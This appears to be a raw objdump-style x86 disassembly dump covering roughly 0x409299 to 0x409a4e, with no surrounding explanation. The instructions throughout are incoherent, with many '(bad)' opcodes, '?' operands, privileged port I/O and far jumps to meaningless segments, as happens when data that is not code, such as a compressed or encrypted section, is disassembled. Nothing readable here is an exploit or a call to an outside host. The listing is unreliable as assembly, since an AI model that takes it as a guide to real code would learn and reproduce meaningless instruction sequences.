  409299:	sub    DWORD PTR [eax],esp
  40929b:	xor    esi,DWORD PTR [ecx+0x769a5674]
  4092a1:	sub    DWORD PTR [edi],0xf031bb5b
  4092a7:	icebp  
  4092a8:	or     eax,0xd0778539
  4092ad:	es mov dl,0x1c
  4092b0:	mov    al,0x74
  4092b2:	int    0xe4
  4092b4:	mov    bl,0x25
  4092b6:	ficomp DWORD PTR [edi]
  4092b8:	stos   BYTE PTR es:[edi],al
  4092b9:	mov    al,0xcc
  4092bb:	pusha  
  4092bc:	mov    esp,0x40e4ffde
  4092c1:	pop    ss
  4092c2:	(bad)  
  4092c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c4:	dec    eax
  4092c5:	aam    0x2b
  4092c7:	add    ebp,DWORD PTR [ecx+0x6f6c0e9d]
  4092cd:	mov    ebx,0x7e21b0ee
  4092d2:	xchg   ebp,eax
  4092d3:	lds    eax,FWORD PTR [ebx+eax*4]
  4092d6:	ins    BYTE PTR es:[edi],dx
  4092d7:	scas   al,BYTE PTR es:[edi]
  4092d8:	jne    0x4092c7
  4092da:	jae    0x409330
  4092dc:	lods   al,BYTE PTR cs:[esi]
  4092de:	mov    ebx,0xf547907a
  4092e3:	(bad)  
  4092e4:	mov    dh,0xbc
  4092e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e7:	call   0x6973:0x1d8bab76
  4092ee:	add    cl,BYTE PTR [ebp-0x3b]
  4092f1:	hlt    
  4092f2:	jne    0x4092ba
  4092f4:	jg     0x409352
  4092f6:	inc    esi
  4092f7:	imul   eax,DWORD PTR [ebx],0xffffffa7
  4092fa:	stos   BYTE PTR es:[edi],al
  4092fb:	out    0x8,eax
  4092fd:	call   0x62b08bba
  409302:	xlat   BYTE PTR ds:[ebx]
  409303:	pop    edi
  409304:	push   0xffffff89
  409306:	dec    esi
  409307:	into   
  409308:	sbb    BYTE PTR [esi-0x46],bl
  40930b:	mov    bl,BYTE PTR [ebp*1+0x4ffc52ef]
  409312:	jecxz  0x4092fe
  409314:	xchg   ebp,esi
  409316:	rol    BYTE PTR [ecx-0x17b9f9de],1
  40931c:	mul    BYTE PTR [bx+0x47]
  409320:	data16 lods al,BYTE PTR ds:[esi]
  409322:	icebp  
  409323:	scas   eax,DWORD PTR es:[edi]
  409324:	xor    al,0x70
  409326:	inc    esi
  409327:	or     dl,ch
  409329:	lock dec edi
  40932b:	xor    al,0x4a
  40932d:	les    eax,FWORD PTR [ecx-0x1a]
  409330:	not    DWORD PTR [eax+0x329f0039]
  409336:	ror    cl,cl
  409338:	clc    
  409339:	xor    al,0xae
  40933b:	mov    ecx,0x665f9779
  409340:	out    0x4c,al
  409342:	retf   0x8340
  409345:	jge    0x409360
  409347:	pop    es
  409348:	dec    ebp
  409349:	pop    edi
  40934a:	gs retf 
  40934c:	into   
  40934d:	xchg   dh,bl
  40934f:	jbe    0x40933a
  409351:	aad    0x48
  409353:	test   al,0xea
  409355:	or     eax,DWORD PTR [ebx+0x16e7bdd4]
  40935b:	add    edx,DWORD PTR [ebx-0x24]
  40935e:	outs   dx,BYTE PTR ds:[esi]
  40935f:	mov    esi,0xa77eb16
  409364:	mov    ds:0x706722d9,al
  409369:	mov    WORD PTR [ebp+0x68],?
  40936c:	push   0xe73043ff
  409371:	cli    
  409372:	xor    esi,ebx
  409374:	in     al,dx
  409375:	(bad)
  409378:	mov    bl,0xd5
  40937a:	inc    ebp
  40937b:	xchg   edx,eax
  40937c:	outs   dx,BYTE PTR ds:[esi]
  40937d:	(bad)  
  40937e:	dec    edx
  40937f:	je     0x40930b
  409381:	sbb    DWORD PTR [edi-0x54cec732],0xffffffa3
  409388:	fidivr DWORD PTR [eax+0x7]
  40938b:	pop    edi
  40938c:	mov    cl,dh
  40938e:	dec    eax
  40938f:	out    dx,al
  409390:	sbb    al,0x2c
  409392:	cmp    cl,BYTE PTR [edx+0x70]
  409395:	fcom   DWORD PTR [edx]
  409397:	mov    dl,0x5a
  409399:	inc    ecx
  40939a:	cmp    BYTE PTR [ebx+0x2895d9ac],al
  4093a0:	jg     0x409323
  4093a2:	pause  
  4093a4:	stc    
  4093a5:	(bad)  
  4093a6:	mov    edi,0xa964077
  4093ab:	loopne 0x40937c
  4093ad:	dec    ecx
  4093ae:	call   0xeb9fa343
  4093b3:	in     eax,0xd4
  4093b5:	mov    bl,0x87
  4093b7:	addr16 push ss
  4093b9:	test   al,0xb3
  4093bb:	(bad)  
  4093bc:	out    dx,eax
  4093bd:	pop    esp
  4093be:	mov    eax,0x35210930
  4093c3:	dec    ebx
  4093c4:	cmp    esi,DWORD PTR [ebx-0x65]
  4093c7:	rcr    BYTE PTR [edx+0x2ebb5617],1
  4093cd:	cld    
  4093ce:	fwait
  4093cf:	add    ebx,0xffffff94
  4093d2:	pop    ds
  4093d3:	lock dec edi
  4093d5:	ror    ecx,1
  4093d7:	psubsw mm6,QWORD PTR [ecx+0x50154255]
  4093de:	push   ebx
  4093df:	mov    gs,esi
  4093e1:	jle    0x409405
  4093e3:	jnp    0x40942e
  4093e5:	fmul   QWORD PTR [esi+0x17]
  4093e8:	xor    BYTE PTR [ecx+0x4ca68534],bl
  4093ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ef:	into   
  4093f0:	xor    eax,ebp
  4093f2:	and    eax,0x9f3cada7
  4093f7:	dec    esi
  4093f8:	fsubr  QWORD PTR ds:0x3f1f0413
  4093fe:	jns    0x40938f
  409400:	or     DWORD PTR [eax],ecx
  409402:	(bad)  
  409403:	pop    eax
  409404:	jmp    0x46a1:0xc7e24150
  40940b:	fisub  WORD PTR [edi-0x797460d8]
  409411:	jbe    0x40946a
  409413:	ins    DWORD PTR es:[edi],dx
  409414:	outs   dx,DWORD PTR ds:[esi]
  409415:	push   0xffffff92
  409417:	xor    esi,esi
  409419:	cli    
  40941a:	mov    bl,BYTE PTR [ecx]
  40941c:	out    0x41,al
  40941e:	arpl   WORD PTR ds:0x340cea92,dx
  409424:	dec    esp
  409425:	mov    DWORD PTR [eax-0x1a],edx
  409428:	mov    ah,cl
  40942a:	and    BYTE PTR [ecx-0x6c07ad8],ch
  409430:	inc    ecx
  409431:	test   edx,esi
  409433:	dec    edx
  409434:	and    DWORD PTR [edi],ebx
  409436:	rcl    BYTE PTR [esi],cl
  409438:	inc    edi
  409439:	in     al,dx
  40943a:	fisub  DWORD PTR [edi]
  40943c:	popa   
  40943d:	pop    es
  40943e:	rcl    BYTE PTR [edx],cl
  409440:	imul   BYTE PTR gs:[ebx+0x5243b95]
  409447:	mov    ah,0xc7
  409449:	hlt    
  40944a:	sbb    al,0x63
  40944c:	inc    edx
  40944d:	cwde   
  40944e:	stos   DWORD PTR es:[edi],eax
  40944f:	sub    ebx,ecx
  409451:	sti    
  409452:	xchg   ebp,eax
  409453:	mov    ebx,0xe97bd16c
  409458:	pop    ecx
  409459:	shl    ah,cl
  40945b:	cmp    esi,DWORD PTR [edi-0x21]
  40945e:	test   BYTE PTR [ebp+0x42],0x80
  409462:	sub    ah,dh
  409464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409465:	sti    
  409466:	fisubr WORD PTR [ebx-0x5cdb5d4]
  40946d:	inc    edi
  40946e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40946f:	cmp    esp,DWORD PTR [eax-0x12]
  409472:	xor    al,0xb2
  409474:	adc    DWORD PTR gs:[ecx-0x39],esi
  409478:	mov    bh,0xec
  40947a:	xor    BYTE PTR ds:0x39f9a68e,bl
  409480:	add    eax,0x3daeebf9
  409485:	aaa    
  409486:	mov    ds:0xb460d915,al
  40948b:	mov    bl,0x37
  40948d:	xlat   BYTE PTR ds:[ebx]
  40948e:	arpl   WORD PTR [ebx],sp
  409490:	jecxz  0x4094f9
  409492:	ret    
  409493:	std    
  409494:	jbe    0x409439
  409496:	aaa    
  409497:	push   ebp
  409498:	dec    eax
  409499:	dec    edi
  40949a:	loopne 0x409445
  40949c:	and    DWORD PTR [edi],0x447fa601
  4094a2:	adc    edi,edi
  4094a4:	pusha  
  4094a5:	dec    esp
  4094a6:	mov    esi,0xb3b9ba36
  4094ab:	out    0x53,al
  4094ad:	test   DWORD PTR [edx],esi
  4094af:	adc    BYTE PTR [eax-0x67],dl
  4094b2:	and    ecx,DWORD PTR ss:[ebx+0x4415319d]
  4094b9:	xor    al,bl
  4094bb:	sbb    eax,0x33102154
  4094c0:	or     al,BYTE PTR [esi]
  4094c2:	loopne 0x4094fe
  4094c4:	call   0xa737:0x1091b97f
  4094cb:	fidivr DWORD PTR [esi-0x4d]
  4094ce:	shl    DWORD PTR [edi+0x36d442b6],1
  4094d4:	mov    al,0xd
  4094d6:	mov    ds:0x71d9f4c7,al
  4094db:	outs   dx,DWORD PTR ds:[esi]
  4094dc:	int3   
  4094dd:	xor    ebx,edi
  4094df:	aas    
  4094e0:	fcom   QWORD PTR [ebx+edi*1]
  4094e3:	jbe    0x4094b7
  4094e5:	in     al,dx
  4094e6:	push   ss
  4094e7:	mov    BYTE PTR [ebp+0x67],al
  4094ea:	mov    edx,0xe2fd422c
  4094ef:	ror    BYTE PTR [ebp+0x4c],1
  4094f2:	add    bh,dl
  4094f4:	dec    edx
  4094f5:	mov    ds:0x931ca367,al
  4094fa:	lea    ecx,[edx+0x47d06a2b]
  409500:	getsec 
  409502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409503:	out    dx,al
  409504:	jle    0x4094d8
  409506:	pop    edi
  409507:	cmp    DWORD PTR [ebx],0x9c291864
  40950d:	dec    ebx
  40950e:	mov    ah,0xcc
  409510:	sbb    DWORD PTR [eax],0xffffffdc
  409513:	pop    esi
  409514:	add    eax,0x64af1e42
  409519:	push   ss
  40951a:	popa   
  40951b:	pop    ss
  40951c:	fadd   st,st(1)
  40951e:	push   ebp
  40951f:	fst    DWORD PTR [edx-0x33559446]
  409525:	mov    edx,0x73f56e37
  40952a:	retf   0x718a
  40952d:	iret   
  40952e:	push   edx
  40952f:	mov    DWORD PTR [edi+0x5607d2b0],esi
  409535:	xor    esp,eax
  409537:	pop    esi
  409538:	mov    ah,0xcb
  40953a:	popa   
  40953b:	adc    DWORD PTR [esi-0x65],eax
  40953e:	adc    al,0x34
  409540:	pop    es
  409541:	jmp    0x4094e2
  409543:	jbe    0x409533
  409545:	lahf   
  409546:	arpl   WORD PTR [ebx-0x6bc21c1b],bp
  40954c:	bound  ebx,QWORD PTR [ecx+0x2d]
  40954f:	fidiv  DWORD PTR [edx+0x67e30987]
  409555:	sahf   
  409556:	js     0x409512
  409558:	or     BYTE PTR [edi],cl
  40955a:	xchg   DWORD PTR [esi-0x2e],esp
  40955d:	mov    eax,0xec062088
  409562:	dec    eax
  409563:	inc    edx
  409564:	pop    ebx
  409565:	cmp    ebx,0x3fe8472b
  40956b:	jae    0x40952a
  40956d:	out    0x9d,eax
  40956f:	out    dx,eax
  409570:	cmp    al,0x54
  409572:	in     eax,dx
  409573:	call   0x509ae0ef
  409578:	cmp    esi,esp
  40957a:	adc    edx,DWORD PTR [edx-0x3885017b]
  409580:	js     0x4095b9
  409582:	test   eax,0xc107f1a
  409587:	into   
  409588:	(bad)  
  409589:	loop   0x409531
  40958b:	(bad)  [ecx-0x80]
  40958e:	adc    ebp,edx
  409590:	je     0x4095a0
  409592:	mov    ebx,0xfbf918e7
  409597:	jp     0x40957c
  409599:	mov    bh,BYTE PTR [eax+esi*2]
  40959c:	xchg   edi,eax
  40959d:	and    al,0x12
  40959f:	jecxz  0x40954b
  4095a1:	pop    eax
  4095a2:	sti    
  4095a3:	bswap  esi
  4095a5:	jne    0x4095f7
  4095a7:	not    eax
  4095a9:	jmp    0x101a:0xc3848244
  4095b0:	clc    
  4095b1:	je     0x40960e
  4095b3:	push   esi
  4095b4:	push   es
  4095b5:	stos   BYTE PTR es:[edi],al
  4095b6:	sbb    ebx,DWORD PTR [edx+0x4d368d5]
  4095bc:	rcr    bl,cl
  4095be:	jg     0x409554
  4095c0:	repnz fdiv QWORD PTR ds:0x40b58036
  4095c7:	sub    BYTE PTR [edi+0x7ed6d85],al
  4095cd:	push   edi
  4095ce:	jecxz  0x40958e
  4095d0:	xchg   ebp,eax
  4095d1:	repz sahf 
  4095d3:	out    0xc0,eax
  4095d5:	mov    edi,0xa6d0430d
  4095da:	sahf   
  4095db:	inc    ebp
  4095dc:	pop    esp
  4095dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095de:	jae    0x4095d0
  4095e0:	(bad)  [ebp-0x59a2558d]
  4095e6:	bound  esp,QWORD PTR [ecx+0x6]
  4095e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ea:	sbb    eax,0x88e898a4
  4095ef:	mov    ch,0x29
  4095f1:	pop    esp
  4095f2:	inc    ebp
  4095f3:	sub    ebp,ecx
  4095f5:	nop
  4095f6:	adc    ebx,DWORD PTR [eax-0x60]
  4095f9:	int    0x50
  4095fb:	mov    dh,0xf7
  4095fd:	mov    dh,0xec
  4095ff:	mov    al,0xf0
  409601:	fiadd  WORD PTR [edi]
  409603:	(bad)  
  409605:	jbe    0x409643
  409607:	dec    esp
  409608:	mov    ecx,0x5d220f1a
  40960d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40960e:	lahf   
  40960f:	xchg   edi,eax
  409610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409611:	out    0x73,al
  409613:	out    0xab,eax
  409615:	(bad)  
  409616:	lods   eax,DWORD PTR ds:[esi]
  409617:	popa   
  409618:	sbb    al,0x17
  40961a:	sbb    esp,DWORD PTR ds:0xb1adbc79
  409620:	jle    0x4095ea
  409622:	imul   ebp,edx,0x9a35eb25
  409628:	or     ecx,DWORD PTR [edx]
  40962a:	rcl    BYTE PTR ds:0xbc8127fe,0x6
  409631:	add    DWORD PTR [edx],ebp
  409633:	mov    bh,0xdb
  409635:	pop    eax
  409636:	mov    cl,0xb8
  409638:	jnp    0x4096af
  40963a:	mov    edx,0xea3c919
  40963f:	pop    edi
  409640:	jmp    0xb3b5730f
  409645:	xchg   BYTE PTR [eax-0x519691f3],ah
  40964b:	sub    eax,0x90fac2f9
  409650:	push   ebx
  409651:	inc    ecx
  409652:	sbb    esp,ebp
  409654:	adc    al,0xfc
  409656:	test   BYTE PTR [esi+eiz*4],dh
  409659:	test   DWORD PTR [eax],esi
  40965b:	and    eax,0x97970dce
  409660:	push   edx
  409661:	jno    0x4095ec
  409663:	(bad)  
  409664:	dec    ebx
  409665:	mov    eax,0x8186e3e
  40966a:	sar    DWORD PTR [esi],0x62
  40966d:	(bad)  
  40966f:	push   ax
  409671:	ret    
  409672:	arpl   WORD PTR [ebx-0x5f],si
  409675:	les    edx,FWORD PTR [eax+0x49853987]
  40967b:	sahf   
  40967c:	std    
  40967d:	idiv   DWORD PTR [edx]
  40967f:	js     0x40969e
  409681:	and    eax,0xecec517d
  409686:	les    ecx,FWORD PTR [eax]
  409688:	stos   BYTE PTR es:[edi],al
  409689:	out    0xc,al
  40968b:	or     edx,DWORD PTR [ebp-0x56b31b53]
  409691:	mov    dl,0x7
  409693:	mov    ds:0x33061b98,al
  409698:	sbb    ch,BYTE PTR [esi+0x5e]
  40969b:	dec    ebp
  40969c:	jge    0x4096fd
  40969e:	mov    ecx,0xc205a3c4
  4096a3:	or     DWORD PTR [edx+0x2a01fdb9],esi
  4096a9:	test   BYTE PTR [edi+edx*8-0x241112bb],cl
  4096b0:	pop    DWORD PTR [ebx+esi*1-0x13]
  4096b4:	jne    0x40966c
  4096b6:	pop    esp
  4096b7:	jnp    0x409728
  4096b9:	int    0xdd
  4096bb:	sub    al,0x3
  4096bd:	int3   
  4096be:	xor    BYTE PTR [ebx],cl
  4096c0:	dec    esi
  4096c1:	sub    BYTE PTR [ebx+edx*1-0x26],0xe6
  4096c6:	into   
  4096c7:	nop
  4096c8:	aaa    
  4096c9:	jg     0x4096af
  4096cb:	lock lea esi,[edx+0x17]
  4096cf:	ret    
  4096d0:	dec    ecx
  4096d1:	jle    0x4096e8
  4096d3:	sbb    BYTE PTR [ebx+edi*1],ch
  4096d6:	std    
  4096d7:	xchg   esp,eax
  4096d8:	jecxz  0x409739
  4096da:	fadd   DWORD PTR [esi-0x1c4c2ef6]
  4096e0:	test   esi,esi
  4096e2:	stos   BYTE PTR es:[edi],al
  4096e3:	aaa    
  4096e4:	scas   eax,DWORD PTR es:[edi]
  4096e5:	mov    al,0xa5
  4096e7:	adc    al,bl
  4096e9:	xlat   BYTE PTR ds:[ebx]
  4096ea:	jno    0x409687
  4096ec:	pop    ecx
  4096ed:	rol    BYTE PTR [edi-0x5701142c],cl
  4096f3:	icebp  
  4096f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096f5:	ficom  WORD PTR [edx-0x71]
  4096f8:	cmc    
  4096f9:	enterw 0xa34c,0x36
  4096fe:	int3   
  4096ff:	sub    ebp,DWORD PTR [edi+0x77eca2ba]
  409705:	lea    ebx,[ebp+0x5a026713]
  40970b:	out    0x4d,eax
  40970d:	pop    ebx
  40970e:	add    BYTE PTR [esp+esi*2+0x664b8b25],0xb1
  409716:	xchg   ebx,eax
  409717:	push   ds
  409718:	dec    eax
  409719:	or     eax,0xe5f040be
  40971e:	push   0xc6c7809f
  409723:	xor    ah,BYTE PTR [ebp-0x1579fae8]
  409729:	dec    ecx
  40972a:	retf   0xa519
  40972d:	je     0x40973d
  40972f:	int3   
  409730:	jp     0x4096f4
  409732:	xchg   edi,eax
  409733:	dec    ebx
  409734:	mov    ebx,0xd1893a1d
  409739:	stc    
  40973a:	adc    al,0xa7
  40973c:	sbb    esi,esi
  40973e:	scas   al,BYTE PTR es:[edi]
  40973f:	fst    DWORD PTR [ecx+0x70]
  409742:	in     eax,dx
  409743:	mov    esp,0xb06d86dd
  409748:	jns    0x40978f
  40974a:	sbb    BYTE PTR [ebx],al
  40974c:	leave  
  40974d:	test   al,0x97
  40974f:	jmp    0x409781
  409751:	lea    ebp,[esi]
  409753:	add    eax,0xdf5c736b
  409758:	mov    dl,0xee
  40975a:	cmp    eax,0x48aee33
  40975f:	sub    al,BYTE PTR [ebp-0x72e1be46]
  409765:	jmp    0xa999f6cd
  40976a:	push   es
  40976b:	xchg   edi,eax
  40976c:	lea    ebx,[ebx+ebx*4+0x78192e00]
  409773:	xchg   ebp,eax
  409774:	lea    ebp,[ebx-0x25bb6032]
  40977a:	cmp    BYTE PTR [edi-0x78],0xfa
  40977e:	inc    esi
  40977f:	(bad)  
  409780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409781:	cmp    eax,0x8052c57a
  409786:	inc    ebp
  409787:	pop    esi
  409788:	fisubr DWORD PTR es:[ebx+0x50]
  40978c:	push   ebx
  40978d:	jno    0x40978e
  40978f:	fld    TBYTE PTR [eax]
  409791:	ret    
  409792:	inc    edi
  409793:	fbstp  TBYTE PTR [ebx]
  409795:	sub    edi,DWORD PTR [esi-0x567523c2]
  40979b:	pop    esi
  40979c:	dec    ebx
  40979d:	lahf   
  40979e:	inc    edi
  40979f:	gs mov ah,0x9b
  4097a2:	pusha  
  4097a3:	jb     0x409810
  4097a5:	push   cs
  4097a6:	sahf   
  4097a7:	outs   dx,BYTE PTR ds:[esi]
  4097a8:	lds    ebx,FWORD PTR [edx+edx*4+0x44a9968]
  4097af:	mov    al,ds:0x4a6b4399
  4097b4:	inc    ebx
  4097b5:	inc    eax
  4097b6:	xchg   DWORD PTR ds:0x91fa67ef,eax
  4097bc:	repz leave 
  4097be:	or     eax,0xbd5fe472
  4097c3:	and    dh,ah
  4097c5:	int3   
  4097c6:	sbb    BYTE PTR [ebp+0x4eba7231],bh
  4097cc:	push   ss
  4097cd:	or     eax,0xbe6c3b07
  4097d2:	pop    ss
  4097d3:	jo     0x409792
  4097d5:	(bad)  
  4097d6:	loop   0x409817
  4097d8:	mov    ch,0x72
  4097da:	dec    ebx
  4097db:	pop    edx
  4097dc:	sbb    DWORD PTR [edx+0x29],0xe6fd95e3
  4097e3:	push   eax
  4097e4:	in     eax,0x3b
  4097e6:	(bad)  
  4097e7:	in     al,dx
  4097e8:	sbb    eax,0xf04984f2
  4097ed:	xchg   edi,eax
  4097ee:	xchg   ah,dl
  4097f0:	sbb    ebx,edx
  4097f2:	add    DWORD PTR [ebx+ebx*1-0x3f4068ec],0xffffffa9
  4097fa:	cld    
  4097fb:	mov    ebx,DWORD PTR [edx+0x483adcb5]
  409801:	cld    
  409802:	adc    ecx,eax
  409804:	out    dx,eax
  409805:	xchg   edi,eax
  409806:	add    dl,dh
  409808:	leave  
  409809:	popf   
  40980a:	add    eax,0xfbb30f6e
  40980f:	cmp    esi,DWORD PTR [edi+0x2f14fe9e]
  409815:	(bad)  
  409816:	int3   
  409817:	add    ebx,DWORD PTR [esi-0x41cc8f85]
  40981d:	aad    0x18
  40981f:	pop    ds
  409820:	pop    esp
  409821:	mov    al,BYTE PTR [edi+0x14]
  409824:	and    eax,0x62a19615
  409829:	cwde   
  40982a:	xor    DWORD PTR ds:0x7324c4f1,ebp
  409830:	out    0x1b,al
  409832:	mov    fs,eax
  409834:	pop    ds
  409835:	jecxz  0x409895
  409837:	hlt    
  409838:	xchg   ecx,eax
  409839:	cmp    DWORD PTR [ebp-0x4],ebx
  40983c:	call   0xb5ec7c00
  409841:	mov    ds:0xb4dd467,eax
  409847:	loope  0x409858
  409849:	lods   eax,DWORD PTR ds:[esi]
  40984a:	sbb    edx,esp
  40984c:	out    dx,eax
  40984d:	sub    BYTE PTR [ecx+0x12],cl
  409850:	xchg   edi,eax
  409851:	push   ecx
  409852:	adc    BYTE PTR [eax],ch
  409854:	mov    bl,0xa5
  409856:	xchg   esp,eax
  409857:	stos   BYTE PTR es:[edi],al
  409858:	xchg   esp,eax
  409859:	call   0xabad9ce9
  40985e:	xchg   BYTE PTR [edx+0x2e],bh
  409861:	sbb    ah,BYTE PTR [edi]
  409863:	cmp    al,dh
  409865:	push   ebx
  409866:	mov    ah,BYTE PTR [ecx+0x27c0e5d8]
  40986c:	xor    eax,0xf6028d7f
  409871:	pop    esp
  409872:	aaa    
  409873:	out    0x7f,al
  409875:	add    BYTE PTR [ecx+0x71],al
  409878:	xor    ebx,DWORD PTR [edi-0x26e15488]
  40987e:	mov    ?,WORD PTR [edx+0x35401ae0]
  409884:	jl     0x40982e
  409886:	cmp    DWORD PTR [ecx+0x19],eax
  409889:	cmp    al,0x84
  40988b:	dec    ebx
  40988c:	lods   eax,DWORD PTR ds:[esi]
  40988d:	xchg   esp,eax
  40988e:	mov    ah,0x23
  409890:	inc    edx
  409891:	dec    eax
  409892:	inc    DWORD PTR [edx]
  409894:	or     eax,0x93809d67
  409899:	mov    fs,WORD PTR [esi+0x7904a788]
  40989f:	jnp    0x40986c
  4098a1:	in     eax,0x2a
  4098a3:	call   0x68c0:0x36005917
  4098aa:	xor    ecx,esi
  4098ac:	lea    ebp,[ebp+0x11]
  4098af:	xchg   ecx,eax
  4098b0:	stos   BYTE PTR es:[edi],al
  4098b1:	(bad)
  4098b5:	in     al,0x85
  4098b7:	leave  
  4098b8:	sbb    edx,edi
  4098ba:	outs   dx,BYTE PTR ds:[esi]
  4098bb:	iret   
  4098bc:	cmp    DWORD PTR [edi],ebx
  4098be:	je     0x409876
  4098c0:	or     eax,0xd72504a6
  4098c5:	cmp    al,ch
  4098c7:	or     eax,0xd91f5e8f
  4098cc:	mov    cl,0xeb
  4098ce:	mov    al,0xe7
  4098d0:	cmc    
  4098d1:	mov    dh,0x6b
  4098d3:	mov    dh,0x7a
  4098d5:	jae    0x4098f4
  4098d7:	(bad)  
  4098d8:	(bad)  
  4098d9:	pop    ds
  4098da:	mov    bh,0xe
  4098dc:	mov    ds:0xe2c8bf3b,eax
  4098e1:	leave  
  4098e2:	loope  0x4098e5
  4098e4:	in     al,dx
  4098e5:	fild   DWORD PTR [eax-0x19]
  4098e8:	ins    BYTE PTR es:[edi],dx
  4098e9:	mov    edx,0xdfb367cf
  4098ee:	jg     0x4098c4
  4098f0:	adc    BYTE PTR [edx+0x9],ah
  4098f3:	lahf   
  4098f4:	push   0xffffffaf
  4098f6:	pop    es
  4098f7:	popf   
  4098f8:	das    
  4098f9:	pop    ebx
  4098fa:	mov    cl,0x6d
  4098fc:	mov    cl,0x7
  4098fe:	push   ebx
  4098ff:	jo     0x409932
  409901:	call   0xafb5f35d
  409906:	pop    esi
  409907:	push   ecx
  409908:	xchg   BYTE PTR [esi-0x24],ch
  40990b:	inc    esi
  40990c:	inc    esp
  40990d:	les    esp,FWORD PTR [eax+0x77]
  409910:	dec    ebx
  409911:	leave  
  409912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409913:	xor    al,0x21
  409915:	repnz stos BYTE PTR es:[edi],al
  409917:	jae    0x40996e
  409919:	push   0xc0366db9
  40991e:	mov    dl,0x9
  409920:	inc    esp
  409921:	test   BYTE PTR [edi+ebx*4],bh
  409924:	jbe    0x4098e3
  409926:	es push ecx
  409928:	push   es
  409929:	outs   dx,DWORD PTR ds:[esi]
  40992a:	mov    DWORD PTR [esi+0x58850158],edx
  409930:	fmul   QWORD PTR [edx-0x64]
  409933:	mov    esp,0x2286b23b
  409938:	jmp    0x4098e9
  40993a:	sub    eax,0xb8eb63c4
  40993f:	add    BYTE PTR [edi+eax*2+0x4b],cl
  409943:	adc    dl,BYTE PTR [ecx+0x731475ec]
  409949:	and    al,0x8a
  40994b:	int    0xdc
  40994d:	fadd   QWORD PTR ds:0xb682788e
  409953:	and    eax,0x2dc83883
  409958:	lods   eax,DWORD PTR ds:[esi]
  409959:	pop    ecx
  40995a:	fwait
  40995b:	inc    eax
  40995c:	or     edi,ebx
  40995e:	jo     0x4099dc
  409960:	xchg   ebx,eax
  409961:	iret   
  409962:	cmp    dl,0x46
  409965:	and    eax,0xa79a8a92
  40996a:	push   ecx
  40996b:	xor    DWORD PTR [ebx-0xce5bb63],ecx
  409971:	lods   al,BYTE PTR ds:[esi]
  409972:	pop    eax
  409973:	pop    ebx
  409974:	xchg   edi,eax
  409975:	dec    ebp
  409976:	nop
  409977:	(bad)  
  409978:	xchg   edx,eax
  409979:	xchg   ebx,ebx
  40997b:	ds psrlq mm4,0xfe
  409980:	push   ecx
  409981:	sbb    al,0xf8
  409983:	mov    dl,0x8e
  409985:	loopne 0x409989
  409987:	das    
  409988:	in     al,dx
  409989:	call   0x21a1ce29
  40998e:	mov    eax,eax
  409990:	fs inc ecx
  409992:	ja     0x4099a8
  409994:	inc    esp
  409995:	enter  0x7f32,0xa6
  409999:	push   ebx
  40999a:	retf   0x5253
  40999d:	pop    edx
  40999e:	mov    ds:0xce2193bc,al
  4099a3:	and    DWORD PTR [esi],ecx
  4099a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a6:	shl    DWORD PTR [ecx+0xb],1
  4099a9:	cmp    DWORD PTR [eax+eax*4],edi
  4099ac:	std    
  4099ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ae:	inc    edx
  4099af:	lods   al,BYTE PTR ds:[esi]
  4099b0:	mov    eax,ds:0x1a0fbe65
  4099b5:	cdq    
  4099b6:	pop    edi
  4099b7:	mov    ah,0x27
  4099b9:	and    DWORD PTR [ebx+0x1f],eax
  4099bc:	ret    0x2537
  4099bf:	nop
  4099c0:	and    al,0xb3
  4099c2:	adc    al,0x1c
  4099c5:	in     eax,dx
  4099c6:	cmp    DWORD PTR [edi+0x6ba6a197],edi
  4099cc:	jl     0x4099d3
  4099ce:	int    0x11
  4099d0:	inc    ebp
  4099d1:	xchg   edx,eax
  4099d2:	xchg   esp,eax
  4099d3:	rol    BYTE PTR [ecx],1
  4099d5:	iret   
  4099d6:	sbb    DWORD PTR [ebp-0x316e0bbd],0x7fa9c064
  4099e0:	sti    
  4099e1:	std    
  4099e2:	or     bl,cl
  4099e4:	mul    DWORD PTR [esi]
  4099e6:	adc    ecx,DWORD PTR [esi-0x6e0899a]
  4099ec:	cmp    edx,DWORD PTR [esi]
  4099ee:	jne    0x409a19
  4099f0:	cmp    al,0x6
  4099f2:	clc    
  4099f3:	add    DWORD PTR [edi],esp
  4099f5:	xchg   edx,eax
  4099f6:	add    cl,BYTE PTR ss:[eax-0x37]
  4099fa:	call   0xa8565fec
  4099ff:	pop    ebp
  409a00:	ins    DWORD PTR es:[edi],dx
  409a01:	mov    esp,0xc35081d6
  409a06:	fild   DWORD PTR ds:0xf23eb
  409a0c:	inc    edx
  409a0d:	push   0x16a52a68
  409a12:	inc    edi
  409a13:	aam    0xb4
  409a15:	lds    esp,FWORD PTR [ecx-0x77]
  409a18:	sub    eax,edi
  409a1a:	lock jp 0x409a76
  409a1d:	clc    
  409a1e:	mov    DWORD PTR [ebp-0x480dca7c],eax
  409a24:	test   ecx,esi
  409a26:	fcmovbe st,st(5)
  409a28:	aas    
  409a29:	iret   
  409a2a:	xor    edi,edx
  409a2c:	jg     0x409aa4
  409a2e:	je     0x409a61
  409a30:	or     BYTE PTR [edi+0x34],bh
  409a33:	pop    ebp
  409a34:	push   esi
  409a35:	push   ss
  409a36:	xchg   esi,eax
  409a37:	inc    ebp
  409a38:	fsubr  st(4),st
  409a3a:	clc    
  409a3b:	xlat   BYTE PTR ds:[ebx]
  409a3c:	xor    al,0x7f
  409a3e:	jae    0x4099dc
  409a40:	mov    esp,0x7d0f4029
  409a45:	std    
  409a46:	les    edi,FWORD PTR [ebp+esi*1+0x5b]
  409a4a:	dec    eax
  409a4b:	push   es
  409a4c:	(bad)  
  409a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a4e:	sub    al,0xed
